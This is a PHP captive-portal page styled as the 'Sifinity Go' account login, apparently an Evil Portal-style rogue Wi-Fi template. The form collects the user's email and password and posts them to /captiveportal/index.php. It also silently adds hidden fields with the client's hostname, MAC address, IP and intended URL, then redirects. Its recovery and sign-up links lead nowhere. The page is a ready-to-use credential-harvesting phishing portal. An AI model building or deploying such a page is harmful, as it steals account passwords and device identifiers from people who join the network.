<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<html>

<head>

  <title>Sifinity Go - Access your account</title>

  <meta charset='UTF-8'>
  <meta http-equiv="cache-control" content="no-cache" />
  <meta http-equiv="expires" content="0" />
  <meta http-equiv="pragma" content="no-cache" />
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

  <script src="jquery-2.2.1.min.js"></script>
  <script type="text/javascript">
    function redirect() {
      setTimeout(function() {
        window.location = "/captiveportal/index.php";
      }, 100);
    }
  </script>

  <link rel="stylesheet" href="assets/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/css/style.css">
  <link rel="icon" type="image/png" href="assets/img/sifinity_logo.png" />

  <style>
    /* Adaptación del estilo a Sifinity Go */
    body {
      background-color: #f8f9fa;
      background-image: url('assets/img/sifinity_bg.jpeg'); /* Fondo personalizado para Sifinity Go */
      background-size: cover;
      background-attachment: fixed;
      background-position: center;
      height: 100vh;
    }

    .container {
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100%;
    }

    .account-wall {
      background-color: white;
      padding: 40px;
      border-radius: 10px;
      box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 350px;
    }

    .header-logo {
      /*margin-bottom: 2px; */
      display: block;
      margin: 0 auto;
      max-width: 20%;  /* Asegura que la imagen nunca sea más ancha que su contenedor */
      max-height: 80px; /* Ajusta la altura máxima según tu preferencia */
      height: 20%;     /* Mantiene la proporción de la imagen */
      width: 20%;      /* Mantiene la proporción de la imagen */
    }

    .login-title {
      font-size: 22px;
      font-weight: bold;
      color: #007bff;
      margin-bottom: 20px;
    }

    .form-signin input {
      margin-bottom: 15px;
      font-size: 16px;
      padding: 10px;
      width: 100%;
      border-radius: 5px;
      border: 1px solid #ced4da;
    }

    .btn-primary {
      background-color: #007bff;
      border-color: #007bff;
      font-size: 18px;
      padding: 10px;
      border-radius: 5px;
      color: white;
      cursor: pointer;
    }

    .btn-primary:hover {
      background-color: #0056b3;
    }

    .terms-text1 {
      font-size: 14px;
      color: #6c757d;
      margin-top: 20px;
    }

    .terms-text1 a {
      color: #007bff;
      text-decoration: none;
    }

    .terms-text1 a:hover {
      text-decoration: underline;
    }

    .text-center {
      text-align: center;
    }

  </style>

</head>

<body>

  <div class="container">
    <div class="account-wall">

      <div class="header-logo">
        <img alt="Sifinity Go" class="logo" src="assets/img/sifinity_logo.png">
      </div>

      <h1 class="login-title">Log in to Sifinity Go</h1>

      <form method="POST" action="/captiveportal/index.php" onsubmit="redirect()" class="form-signin">

        <input type="text" name="email" class="form-email" placeholder="User E-mail" autofocus autocorrect="off" autocomplete="off" autocapitalize="off" required>
        <input type="password" name="password" class="form-password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required>

        <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
        <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
        <input type="hidden" name="target" value="<?=$destination?>">

        <button class="btn-primary btn-block" name="login" type="submit">Log in</button>

        <div class="text-center terms-text1">
          <a href="#" class="url-color">Forgot Password?</a> · 
          <a href="#" class="url-color">Sign up for Sifinity Go</a>
        </div>

      </form>

    </div>
  </div>

</body>

</html>
